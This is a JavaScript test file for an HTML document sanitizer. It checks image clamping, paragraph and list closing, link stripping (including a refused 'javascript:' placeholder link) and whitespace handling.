  ok("review 4 / 11 — a free picture's place clamped (left ≥ −27 mm, top −20 mm … 50 pages)", S(`<img class="free" src="/brand/logo.png" style="left:-30mm;top:4000mm;width:20mm">`) === `<img src="/brand/logo.png" class="free" style="left:-27mm;top:4000mm;width:20mm">` && S(`<img class="free" src="/brand/logo.png" style="left:-21mm;top:-25mm;width:20mm">`) === `<img src="/brand/logo.png" class="free" style="left:-21mm;top:-20mm;width:20mm">` && S(`<img class="free" src="/brand/logo.png" style="left:10mm;top:40000mm;width:20mm">`) === `<img src="/brand/logo.png" class="free" style="left:10mm;top:14850mm;width:20mm">`);
  // 12 — a link to this very page is no link
  ok("review 4 / 12 — «#…», «?…», an empty address and a refused one: the words, no link (never «#»)", S(`<a href="#sec1">a</a><a href="">b</a><a href="?x=1">c</a><a href=" #x">d</a><a href="javascript:x">e</a><a href="https://e.example/#x">f</a>`) === `abcde<a href="https://e.example/#x"${LT}>f</a>`);
}
// round 9 review 4, second look: what fix1 broke or left rough
{
  const S = sanitizeDocHtml;
  // 2 — a free picture no lower than 50 pages: a signature on a plan's last page (12–20) never moves
  ok("review 4b / 2 — a free picture's lowest place is page 50 (a signature on page 20 stays put)", S(`<img class="free" src="/brand/logo.png" style="left:0mm;top:29700mm;width:30mm">`) === `<img src="/brand/logo.png" class="free" style="left:0mm;top:14850mm;width:30mm">` && S(`<img class="free" src="/brand/logo.png" style="left:0mm;top:5800mm;width:30mm">`) === `<img class="free" src="/brand/logo.png" style="left:0mm;top:5800mm;width:30mm">`);
  // 4 — structure: a centred box; the paragraph a box closes, closed here; terms and definitions side by side; words kept apart
  ok("review 4b / 4 — <center>: a centred <div> (its own text-align, after, wins)", S(`<center>c</center><center style="text-align:left">l</center>`) === `<div style="text-align:center">c</div><div style="text-align:center;text-align:left">l</div>`);
  ok("review 4b / 4 — a box opening in a paragraph closes it — no stray «</p>» left to make an empty one", S(`<p>a<table><tr><td>x</td></tr></table>b</p>`) === `<p>a</p><table><tr><td>x</td></tr></table>b` && S(`<p>a<div>b</div>c</p><p>d<ul><li>e</ul>`) === `<p>a</p><div>b</div>c<p>d</p><ul><li>e</ul>` && S(`<p>a<p>b`) === `<p>a</p><p>b</p>`);
  ok("review 4b / 4 — …a paragraph in a cell is closed by what opens in that cell, not past it", S(`<p>x<table><tr><td><p>a<ul><li>b</li></ul></td></tr></table>`) === `<p>x</p><table><tr><td><p>a</p><ul><li>b</li></ul></td></tr></table>`);
  const dl = "<dl>" + Array.from({ length: 110 }, (_, i) => `<dt>T${i}<dd>D${i}`).join("") + "</dl>";
  ok("review 4b / 4 — a term or definition closes the one before it: 110 unclosed pairs are 220 boxes side by side, none dropped", S(dl) === "<div>" + Array.from({ length: 110 }, (_, i) => `<div>T${i}</div><div>D${i}</div>`).join("") + "</div>", S(dl).slice(0, 120));
  ok("review 4b / 4 — …through a <div> (as the browser does), not through another box", S(`<dl><dt>T<dd>D<div><dt>X</div></dl>`) === `<div><div>T</div><div>D<div></div></div><div>X</div></div>` && S(`<dl><dt>T<blockquote><dt>X</blockquote></dl>`) === `<div><div>T<blockquote><div>X</div></blockquote></div></div>`);
  ok("review 4b / 4 — a list item closes the one before it through a <div>, not through a quote", S(`<ul><li>a<div><li>b</div></ul>`) === `<ul><li>a<div><li>b</ul>` && S(`<ul><li>a<blockquote><li>b</blockquote></ul>`) === `<ul><li>a<blockquote><li>b</blockquote></ul>`);
  ok("review 4b / 4 — a button (a meter, a video…) dropped between words leaves a space, not «OKCancel»", S(`<p>x<button>OK</button><button>Cancel</button>y</p>`) === `<p>x OK Cancel y</p>` && S(`<p>a<meter>3</meter> b</p>`) === `<p>a 3 b</p>` && S(`<p>a<label>b</label>c</p>`) === `<p>abc</p>`);
  // 5 — a picture's margins reduced to what fits; a picture a little wider than the column as wide as the column
  ok("review 4b / 5 — a float as wide as its cell keeps the margins above and below it; its side margins are reduced to the room left", S(`<table><tr><td style="width:40mm"><img src="/brand/logo.png" alt="" style="width:60mm;float:left;margin:4px 12px 8px 0">x</td><td>y</td></tr></table>`) === `<table><tr><td style="width:40mm"><img src="/brand/logo.png" alt="" style="width:60mm;float:left;margin:4px 12px 8px 0;margin-left:0mm;margin-right:0mm">x</td><td>y</td></tr></table>`);
  ok("review 4b / 5 — a picture in the line wider than the column (Word's 161 mm) is as wide as the column, not its own size", S(`<p><img src="/brand/logo.png" alt="" style="width:161mm;height:60mm"></p>`) === `<p><img src="/brand/logo.png" alt="" style="width:160.86mm;height:60mm"></p>`);
  ok("review 4b / 5 — the editor's own floats (no width yet) unchanged", S(`<p><img src="/brand/logo.png" alt="" style="float: left; margin: 4px 12px 8px 0px;"></p>`) === `<p><img src="/brand/logo.png" alt="" style="float: left; margin: 4px 12px 8px 0px;"></p>`);
}
// round 9, last look: a tag dropped wherever it stands is dropped inside a link too — the link and its words kept;
// only what the cleaner keeps (a box, a picture, a field, a drawing…) still ends a link's words
{
  const S = sanitizeDocHtml, LT = ` target="_blank" rel="noopener noreferrer"`;
  ok("last look / 3 — a <button>, a <wbr>, a <code>, an <abbr>, a <mark> in a link: dropped, the link kept",
    S(`<a href="https://e.example/">x<button>b</button>y</a>`) === `<a href="https://e.example/"${LT}>x b y</a>` &&
    S(`<p><a href="https://e.example/">https://e.example/a/<wbr>b/<wbr>c</a></p>`) === `<p><a href="https://e.example/"${LT}>https://e.example/a/b/c</a></p>` &&
    S(`<p><a href="https://e.example/"><code>x</code> <abbr title="t">abbr</abbr> <mark>m</mark></a></p>`) === `<p><a href="https://e.example/"${LT}>x abbr m</a></p>`);
  ok("last look / 3 — …what is kept still ends a link's words: a box, a picture, a <section> kept as a box",
    S(`<p><a href="https://e.example/">x<div>y</div></a></p>`) === `<p>x</p><div>y</div>` && S(`<p><a href="https://e.example/">x<img src="/brand/logo.png">y</a></p>`) === `<p>x<img src="/brand/logo.png">y</p>` &&
    S(`<p><a href="https://e.example/">x<section>y</section></a></p>`) === `<p>x</p><div>y</div>`);
}

ok("text that merely mentions a form or a script is not touched", sanitizeDocHtml(`<p>The script of the form: 5 &lt; 6</p>`) === `<p>The script of the form: 5 &lt; 6</p>`);

console.log(`\nsanitize-html.test: ${pass} passed, ${fail} failed`);
if (fail) process.exitCode = 1;
